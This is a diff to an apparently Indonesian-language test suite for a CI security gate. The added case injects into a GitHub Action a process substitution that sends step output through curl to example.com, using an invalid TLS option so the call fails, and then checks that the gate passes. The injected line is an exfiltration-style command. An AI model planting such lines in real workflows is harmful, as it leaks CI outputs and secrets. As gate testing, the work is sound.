@@ -41867,6 +41867,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("rate di atas plafon 1000/detik mati di biner: gerbang lolos (Audit 2924)", rc == 0)
         shutil.rmtree(sub1976, ignore_errors=True)
+        sub1977 = klon(tmp, "sub1977")
+        berkas_aksi1977 = os.path.join(
+            sub1977, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1977, encoding="utf-8") as f:
+            isi_aksi1977 = f.read()
+        baris_aksi1977 = [b for b in isi_aksi1977.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1977 = isi_aksi1977.replace(
+                baris_aksi1977,
+                baris_aksi1977.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --tlsauthtype XXX -d @- https://example.com/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1977 != isi_aksi1977, \
+            "suntikan aksi1977 tidak menembak"
+        with open(berkas_aksi1977, "w", encoding="utf-8") as f:
+            f.write(isi_baru1977)
+        rc, out = jalan(sub1977,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("tlsauthtype selain SRP mati di biner: gerbang lolos (Audit 2925)", rc == 0)
+        shutil.rmtree(sub1977, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
